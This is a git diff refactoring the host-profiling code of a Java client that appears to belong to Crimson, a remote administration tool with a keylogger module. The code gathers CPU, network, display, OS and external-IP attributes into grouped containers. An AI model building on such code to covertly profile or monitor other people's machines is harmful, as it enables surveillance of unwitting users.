@@ -23,6 +23,7 @@ import java.awt.GraphicsEnvironment;
 import com.subterranean_security.crimson.client.modules.Keylogger;
 import com.subterranean_security.crimson.client.store.ConfigStore;
 import com.subterranean_security.crimson.core.Common;
+import com.subterranean_security.crimson.core.attribute.keys.AKeySimple;
 import com.subterranean_security.crimson.core.platform.info.CPU;
 import com.subterranean_security.crimson.core.platform.info.CRIMSON;
 import com.subterranean_security.crimson.core.platform.info.DISP;
@@ -37,7 +38,7 @@ import com.subterranean_security.crimson.core.platform.info.OS.OSFAMILY;
 import com.subterranean_security.crimson.core.platform.info.RAM;
 import com.subterranean_security.crimson.core.platform.info.USER;
 import com.subterranean_security.crimson.core.platform.info.WIN;
-import com.subterranean_security.crimson.core.profile.SimpleAttribute;
+import com.subterranean_security.crimson.core.proto.Delta.AttributeGroupContainer;
 import com.subterranean_security.crimson.core.proto.Delta.EV_ProfileDelta;
 import com.subterranean_security.crimson.core.proto.Keylogger.State;
 import com.subterranean_security.crimson.universal.Universal;
@@ -74,34 +75,33 @@ public final class Platform {
 
 		info.setFig(true);
 
-		info.putStrAttr(SimpleAttribute.CLIENT_VERSION.ordinal(), Common.version);
+		AttributeGroupContainer.Builder general = AttributeGroupContainer.newBuilder();
+		for (AKeySimple sa : AKeySimple.values()) {
 
-		for (SimpleAttribute sa : SimpleAttribute.values()) {
-
-			if (!sa.valid(osFamily, Universal.instance)) {
+			if (!sa.isCompatible(osFamily, Universal.instance)) {
 				continue;
 			}
-			if (sa == SimpleAttribute.NET_EXTERNALIP && !ConfigStore.getConfig().getAllowMiscConnections()) {
+			if (sa == AKeySimple.NET_EXTERNALIP && !ConfigStore.getConfig().getAllowMiscConnections()) {
 				continue;
 			}
 			String value = queryAttribute(sa);
 			if (value != null) {
-				info.putStrAttr(sa.ordinal(), value);
+				general.putAttribute(sa.ordinal(), value);
 			}
 
 		}
-
-		info.addAllGroupAttr(CPU.getAttributes());
-		info.addAllGroupAttr(NIC.getAttributes());
+		info.addGroup(general.build());
+		info.addAllGroup(CPU.getAttributes());
+		info.addAllGroup(NIC.getAttributes());
 
 		if (!GraphicsEnvironment.isHeadless()) {
-			info.addAllGroupAttr(DISP.getAttributes());
+			info.addAllGroup(DISP.getAttributes());
 		}
 
 		return info.build();
 	}
 
-	public static String queryAttribute(SimpleAttribute sa) {
+	public static String queryAttribute(AKeySimple sa) {
 		switch (sa) {
 		case CLIENT_CID:
 			return "" + Common.cvid;
